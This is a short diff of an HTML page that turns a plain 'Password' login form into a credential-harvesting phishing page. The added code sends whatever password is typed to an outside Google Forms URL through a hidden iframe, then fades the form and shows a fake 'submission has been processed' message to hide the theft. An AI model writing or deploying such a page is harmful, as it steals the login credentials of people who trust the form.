@@ -1,10 +1,17 @@
 <DOCTYPE html>
   <html>
     <body>
-      <form>
+      <form name="gform" id="gform" enctype="text/plain" action="https://goo.gl/forms/79OwqgmiehxAOg6l2" target="hidden_iframe" onsubmit="submitted=true;">
   Password:<br>
-  <input type="text" name="firstname"><br>
+  <input type="text" name="entry.1861454328" id="entry.1861454328"><br>
   <input type="submit" value="Log In">
 </form>
+      <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) {}"></iframe>
+      <script type="text/javascript">
+$('#gform').on('submit', function(e) {
+  $('#gform *').fadeOut(2000);
+  $('#gform').prepend('Your submission has been processed...');
+  });
+</script>
     </body>
   </html>
